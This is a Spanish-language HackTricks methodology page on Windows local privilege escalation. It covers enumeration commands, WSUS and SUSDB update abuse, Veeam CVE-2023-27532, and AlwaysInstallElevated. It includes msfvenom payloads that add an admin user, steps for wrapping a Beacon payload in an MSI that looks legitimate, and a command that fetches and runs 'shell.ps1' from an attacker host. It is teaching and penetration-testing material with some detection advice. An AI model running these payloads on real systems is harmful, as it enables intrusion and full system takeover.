# Escalada de privilegios local en Windows

{{#include ../../banners/hacktricks-training.md}}

### **La mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Esta página reúne una metodología general para la escalada de privilegios en Windows a partir de varias guías fundamentales.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Su flujo práctico de enumeración también se basa en talleres y listas de comprobación de la comunidad.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> El material histórico sobre ataques incluye la presentación de DerbyCon sobre escalada de privilegios en Windows.<sup>[[5]](#references)</sup>

## Conceptos iniciales de Windows

### Tokens de acceso

**Si no sabes qué son los tokens de acceso de Windows, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL: DACL/SACL/ACE

**Consulta la siguiente página para obtener más información sobre ACL, DACL, SACL y ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows, lee la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de seguridad de Windows

En Windows hay distintos elementos que podrían **impedirte enumerar el sistema**, ejecutar archivos ejecutables o incluso **detectar tus actividades**. Antes de comenzar la enumeración para la escalada de privilegios, deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** de **defensa**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

El acceso físico también puede convertir una modificación offline de UEFI NVRAM en DMA previo al arranque y en una cadena de modificación de memoria de Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Protección de administrador / elevación silenciosa de UIAccess

Los procesos UIAccess iniciados mediante `RAiLaunchAdminProcess` pueden usarse para alcanzar High IL sin avisos cuando se eluden las comprobaciones de secure-path de AppInfo. Consulta aquí el flujo específico para eludir UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagación del registro de accesibilidad de Secure Desktop puede aprovecharse para escribir una clave arbitraria del registro como SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Las versiones recientes de Windows también introdujeron una vía de LPE mediante **SMB en un puerto arbitrario**, en la que una autenticación NTLM local privilegiada se refleja a través de una conexión TCP SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Información del sistema

### Enumeración de la información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (comprueba también los parches aplicados).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits de versión

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos contiene más de 4.700 vulnerabilidades de seguridad, lo que muestra la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — enumera la compilación del SO, las actualizaciones instaladas y posibles avisos seleccionados; verifica el producto exacto y las actualizaciones posteriores que las sustituyen antes de considerar aplicable un resultado.

Para un exploit local específico de una versión, comprueba tanto la **arquitectura del proceso en ejecución** como la del SO. En Windows de 64 bits, un proceso de 32 bits está sujeto a la [redirección del sistema de archivos WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` normalmente apunta al directorio del sistema de 32 bits, mientras que `%windir%\Sysnative` permite que ese proceso acceda al directorio del sistema nativo. Este alias no está disponible para un proceso de 64 bits. Una compilación del SO o una posible KB faltante no demuestra que el sistema sea vulnerable; compara la compilación en ejecución, las actualizaciones instaladas o posteriores, la arquitectura del proceso y los requisitos previos del exploit con el [boletín de seguridad de Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) correspondiente al problema concreto.

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de GitHub de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Hay credenciales o información de Juicy guardadas en las variables de entorno?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historial de PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Archivos de transcripción de PowerShell

Puedes aprender a habilitar esta opción en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` es solo un ejemplo. La [directiva de transcripción de PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalmente escribe en la carpeta Documentos de cada usuario, pero una configuración `OutputDirectory` o `Start-Transcript -OutputDirectory` puede redirigir los archivos a una carpeta compartida u oculta. Comprueba la ruta de salida efectiva y las ACL del archivo antes de revisar una transcripción: puede contener argumentos de comandos y resultados, incluidas credenciales. Una transcripción legible solo es una pista si su contenido revela una identidad de nivel superior utilizable y esa identidad puede iniciar sesión en el contexto pertinente.

### PowerShell Module Logging

Se registran detalles de las ejecuciones de la canalización de PowerShell, incluidos los comandos ejecutados, las invocaciones de comandos y partes de los scripts. Sin embargo, es posible que no se capturen los detalles completos de la ejecución ni los resultados de salida.

Para habilitar esta función, sigue las instrucciones de la sección «Archivos de transcripción» de la documentación y elige **«Module Logging»** en lugar de **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Para ver los últimos 15 eventos de los registros de PowersShell, puedes ejecutar:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y del contenido íntegro de la ejecución del script, lo que garantiza que cada bloque de código quede documentado mientras se ejecuta. Este proceso conserva un registro de auditoría exhaustivo de cada actividad, valioso para el análisis forense y el estudio de comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se proporcionan conocimientos detallados sobre el proceso.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Los eventos de registro de Script Block se pueden encontrar en el Visor de eventos de Windows, en la ruta: **Registros de aplicaciones y servicios > Microsoft > Windows > PowerShell > Operativo**.\
Para ver los últimos 20 eventos, puedes usar:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Configuración de Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Unidades

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Un endpoint WSUS HTTP es un indicio para investigar una posible interceptación de metadatos de actualización. La explotación también depende de si el cliente usa ese servidor WSUS, de si un atacante puede interceptar o controlar su tráfico y de la política de confianza e instalación de actualizaciones del cliente. La URL por sí sola no permite ejecutar código. [Microsoft recomienda TLS para los metadatos de WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Para empezar, comprueba si la red usa una actualización de WSUS sin SSL ejecutando lo siguiente en cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

O lo siguiente en PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Si recibes una respuesta como alguna de estas:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Cuando `UseWUServer` es `1`, Windows Update usa el servicio de intranet configurado. Esto confirma un requisito previo para la ruta de interceptación HTTP, pero no demuestra que sea posible interceptar el tráfico, aceptar actualizaciones maliciosas o instalarlas con privilegios elevados. Cuando es `0`, esa directiva no selecciona este endpoint de WSUS configurado.

Para explotar estas vulnerabilidades puedes usar herramientas como [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus): son scripts de exploits MiTM preparados para inyectar actualizaciones «falsas» en tráfico WSUS sin SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lee el informe completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Básicamente, este es el fallo que explota este bug:

> Si tenemos la capacidad de modificar el proxy de nuestro usuario local y Windows Updates usa el proxy configurado en los ajustes de Internet Explorer, entonces podemos ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario con privilegios elevados en nuestro equipo.
>
> Además, como el servicio WSUS usa la configuración del usuario actual, también usa su almacén de certificados. Si generamos un certificado autofirmado para el nombre de host de WSUS y lo añadimos al almacén de certificados del usuario actual, podremos interceptar tanto el tráfico HTTP como el HTTPS de WSUS. WSUS no usa mecanismos similares a HSTS para implementar una validación del tipo trust-on-first-use en el certificado. Si el usuario confía en el certificado presentado y este tiene el nombre de host correcto, el servicio lo aceptará.

Puedes explotar esta vulnerabilidad con la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (cuando se publique).

### Actualizaciones de WSUS controladas por el administrador

Existe una ruta diferente cuando la identidad actual puede **publicar y aprobar** actualizaciones en un servidor WSUS. Comprueba la pertenencia efectiva al grupo `WSUS Administrators` del servidor y los permisos delegados de WSUS; luego identifica el grupo de equipos cliente que recibiría una actualización aprobada. [Microsoft exige privilegios de WSUS Administrator para aprobar actualizaciones](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) y [documenta la relación de confianza de publicación](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): los clientes deben confiar en el certificado de firma usado para el contenido publicado localmente. Antes de considerar esto una ruta de escalada, confirma que la actualización candidata esté firmada y sea aceptada, que se aplique al objetivo y que se instale en un contexto con más privilegios. Un valor HTTP `WUServer` o un nombre de grupo, por sí solos, no demuestran que se cumplan esas condiciones.

### Abuso de actualizaciones personalizadas de SUSDB: cargas útiles sin firma mediante `.txt`/`.esd`

Este es un fallo de límite de confianza distinto de interceptar una conexión WSUS HTTP: el requisito previo es tener suficiente acceso a los **procedimientos almacenados de la base de datos de WSUS (`SUSDB`)** para publicar y aprobar una actualización personalizada. Una vía práctica de entrada consiste en retransmitir una cuenta de equipo de WSUS upstream a un servidor MSSQL independiente que aloja `SUSDB`; los requisitos exactos dependen de la implementación, así que primero enumera los permisos `EXECUTE` en lugar de asumir que se necesitan derechos de administrador de SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Para la ruta de ataque independiente que retransmite la autenticación de clientes WSUS de HTTP/8530 a LDAP, SMB o AD CS, consulta [Abusar de WSUS HTTP para retransmitir NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Crear, asignar y aprobar la actualización

El flujo de trabajo de actualizaciones personalizadas usa procedimientos legítimos de WSUS como una API de publicación restringida. Las transiciones de estado importantes son:<sup>[[38]](#references)</sup>

| Etapa | Procedimientos almacenados relevantes |
| --- | --- |
| Importar los metadatos de la actualización | `spImportUpdate` |
| Almacenar fragmentos XML de requisitos previos, localizados y extendidos | `spSaveXMLFragment` |
| Asociar el digest del contenido con su URL controlada por el atacante | `spSetBatchURL` |
| Enumerar/crear un grupo de equipos y agregar el cliente | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Aprobar la instalación para ese grupo | `spDeployUpdate` con `@actionID = 0` y `@isAssigned = 1` |

El nombre de archivo, los digests, el tamaño y el controlador `CommandLineInstallation` deben coincidir en los metadatos y fragmentos importados. Tras asignar la URL del contenido y el grupo objetivo, la aprobación final se parece a lo siguiente; usa identificadores nuevos para la actualización, el grupo y la implementación, en lugar de reutilizar los GUID de ejemplo.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Omisión de la verificación de firma basada en la extensión

WSUS normalmente rechaza contenido ejecutable arbitrario sin firmar. Sin embargo, en `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, la ruta .NET `VerifyFile` establece en false la marca de verificación del certificado cuando el nombre de archivo proporcionado termina en `.txt` o `.esd`; entonces se omite `CheckCertificateSignature` sin demostrar primero que los bytes sean texto o una imagen ESD legítima. Por lo tanto, un PE sin modificar llamado, por ejemplo, payload.exe.txt puede superar la verificación del contenido y luego ser ejecutado por el controlador de instalación de línea de comandos de la actualización. Esto es un error de confusión de políticas y tipos, no una falsificación de firma.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Preparación y automatización compatibles con BITS

Al llamar a `spDeployUpdate`, WSUS obtiene el contenido registrado. El origen debe cumplir las expectativas HTTP de BITS: no basta con que la URL sea accesible, ya que la transferencia utiliza un flujo inicial de `HEAD`/`GET` y solicitudes de rangos de bytes. Un servidor sin compatibilidad con Range genera el evento de sincronización de WSUS `EventId=364`, que indica que BITS requiere el encabezado de protocolo Range.<sup>[[39]](#references)</sup>

El PoC de investigación [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera el SQL necesario para la cadena de importación/fragmento/URL/grupo/despliegue, incluye un cliente MSSQL modificado para ejecutarlo y proporciona `BitsWebServer.py` para preparar el contenido. Una invocación mínima en un laboratorio autorizado es:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Ejecución desatendida y persistencia mediante reintentos

La interacción del lado del cliente depende de la directiva. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opción `4 - Auto download and schedule install`, hace que una actualización aprobada se descargue e instale según la programación configurada, sin que el usuario tenga que seleccionarla manualmente. Durante las pruebas, un payload cuya actualización seguía en estado fallido/incompleto se volvió a ofrecer inmediatamente después de que finalizara el proceso de callback, por lo que el comportamiento de reintento puede convertirse en persistencia mediante ejecución recurrente; es ruidoso porque el cliente muestra un estado de actualización fallida.<sup>[[39]](#references)</sup>

#### Detección y medidas de hardening

Los siguientes puntos de análisis del lado del servidor y del cliente son útiles para esta cadena:<sup>[[39]](#references)</sup>

- Audita la ejecución de `spCreateTargetGroup`, `spSetBatchURL` y `spDeployUpdate` en `SUSDB`; investiga grupos de destino nuevos, orígenes de contenido externos, payloads de actualización `.txt`/`.esd` y despliegues realizados por principales inesperados (especialmente cuentas que no sean de equipo).
- Revisa `C:\Program Files\Update Services\LogFiles` en busca de `ContentSyncAgent`, `FileVerified`, el nombre mal escrito `FileVerficationFailed` y `EventId=364`; correlaciona la verificación con la extensión del payload y la firma mágica del contenido, en vez de confiar en el sufijo.
- Busca instalaciones de Windows Update que fallen o se reintenten repetidamente, así como la ejecución de PE o actividad de red/procesos hijo inesperada desde contenido con nombres `.txt` o `.esd`.
- Exige Extended Protection for Authentication en el servicio de base de datos cuando sea compatible y restringe el acceso de red a la base de datos al servidor WSUS y a los sistemas administrativos autorizados. Minimiza y audita los permisos `EXECUTE` en los procedimientos de actualización personalizados.

## Actualizadores automáticos de terceros e IPC de agentes (local privesc)

Muchos agentes empresariales exponen una superficie de IPC de localhost y un canal de actualización privilegiado. Si se puede coaccionar el registro para que apunte a un servidor del atacante y el actualizador confía en una rogue root CA o en comprobaciones débiles del firmante, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Consulta aquí una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM mediante TCP 9401)

Veeam Backup & Replication y Cloud Connect usan un servicio central de backup en **TCP/9401 de forma predeterminada**. [El aviso de Veeam](https://www.veeam.com/kb4424) describe la divulgación no autenticada de credenciales cifradas de la base de datos de configuración dentro del perímetro de red de backup; una PoC pública independiente demuestra una vía de ejecución de comandos como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Es posible que el servicio se vincule a direcciones distintas de localhost, así que comprueba su dirección y PID reales.

- **Recon**: confirma que TCP/9401 pertenece a `Veeam.Backup.Service.exe` y luego inspecciona el producto instalado y los metadatos de los parches. `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` son indicios, no una comprobación completa de parches.
- **Versiones mínimas corregidas**: Veeam indica **11a build 11.0.1.1261 P20230227** y **12 build 12.0.0.1420 P20230223** como las primeras versiones corregidas; las versiones anteriores están afectadas. Una versión de archivo de cuatro componentes por sí sola no permite distinguir una build base sin parche de un parche posterior sobre esos mismos números de build. Verifica el identificador del parche en el [historial de builds del proveedor](https://www.veeam.com/kb2680) antes de considerar corregida una build límite.
- **Exploit**: coloca una PoC como `VeeamHax.exe` junto con las DLL de Veeam necesarias en el mismo directorio y luego activa un payload SYSTEM a través del socket local:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

El PoC citado demuestra la ejecución de comandos como SYSTEM cuando se cumplen sus requisitos previos adicionales; el aviso del proveedor describe el problema de divulgación de credenciales.
## KrbRelayUp

Un relay local de Kerberos puede pasar de un inicio de sesión con privilegios inferiores a una escritura privilegiada en el directorio cuando un servidor COM adecuado se autentica y la identidad retransmitida tiene permisos sobre el objeto de destino. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) tanto las escrituras LDAP de RBCD como las de `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatiza algunas de estas rutas. Una cadena RBCD requiere delegación aplicable y permisos sobre el objeto de destino, mientras que una cadena de shadow-credential requiere permisos de escritura de claves de credenciales y un KDC que admita la ruta de autenticación con certificados. Ninguna de estas rutas se deriva únicamente de pertenecer al dominio.

Comprueba la política del DC real para [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) y [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), la ACL del objeto de la identidad retransmitida y los niveles de autenticación e suplantación de la clase COM seleccionada. El tipo de inicio de sesión y el contexto de credenciales del usuario que realiza la llamada son importantes: una sesión de WinRM puede comportarse de forma distinta a un inicio de sesión interactivo o con credenciales nuevas. El enrutamiento del firewall/OXID y las actualizaciones instaladas también pueden cambiar el resultado. Considera una política permisiva o una ACL coincidente como elementos que deben revisarse; la enumeración pasiva no debería desencadenar coerción COM, autenticación relay ni escrituras en el directorio. Una shadow credential de cuenta de equipo puede conducir a un ticket de equipo y, solo si esa cuenta tiene los permisos de replicación de directorio necesarios, a una ruta DCSync independiente.

Encuentra el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para obtener más información sobre el flujo del ataque, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Si** estas 2 claves del registro están **habilitadas** (el valor es **0x1**), los usuarios con cualquier nivel de privilegios pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Si tienes una sesión de Meterpreter, puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de PowerUp para crear en el directorio actual un binario MSI de Windows que permita escalar privilegios. Este script genera un instalador MSI precompilado que solicita añadir un usuario o grupo (por lo que necesitarás acceso a la GUI):

```
Write-UserAddMSI
```

Just execute el binario creado para escalar privilegios.

### MSI Wrapper

Lee este tutorial para aprender a crear un MSI wrapper usando estas herramientas. Ten en cuenta que puedes envolver un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comandos**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuevo payload TCP de Windows EXE** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Asigna un nombre al proyecto, como **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory** y haz clic en **Create**.
- Haz clic en **Next** hasta llegar al paso 3 de 4 (elegir los archivos que se incluirán). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Luego, haz clic en **Finish**.
- Resalta el proyecto **AlwaysPrivesc** en **Solution Explorer** y, en **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
  - Hay otras propiedades que puedes cambiar, como **Author** y **Manufacturer**, para que la aplicación instalada parezca más legítima.
- Haz clic derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona el archivo **beacon.exe** y haz clic en **OK**. Esto garantizará que el payload Beacon se ejecute en cuanto se inicie el instalador.
- En **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Por último, **compílalo**.
  - Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de configurar la plataforma en x64.

### MSI Installation

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Para explotar esta vulnerabilidad, puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Configuración de auditoría

Esta configuración determina qué se **registra**, así que debes prestarle atención

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Es interesante saber adónde se envían los registros de Windows Event Forwarding.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas de Administrador local**, garantizando que cada contraseña sea **única, aleatoria y se actualice periódicamente** en los equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden acceder a ellas los usuarios a quienes se hayan concedido permisos suficientes mediante ACLs, lo que les permite ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más información sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Protección de LSA

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de seguridad local (LSA) para **bloquear** los intentos de procesos no confiables de **leer su memoria** o inyectar código, lo que refuerza aún más la seguridad del sistema.\
[**Más información sobre la protección de LSA aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** se introdujo en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo frente a amenazas como los ataques pass-the-hash. [**Aquí encontrarás más información sobre Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credenciales almacenadas en caché

Las **credenciales de dominio** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por los componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, normalmente se establecen las credenciales de dominio del usuario.\
[**Más información sobre las credenciales almacenadas en caché aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Usuarios y grupos

### Enumerar usuarios y grupos

Deberías comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Aprende sobre los grupos privilegiados y cómo aprovecharlos para escalar privilegios aquí:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Obtén más información** sobre qué es un **token** en esta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo aprovecharlos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones

```bash
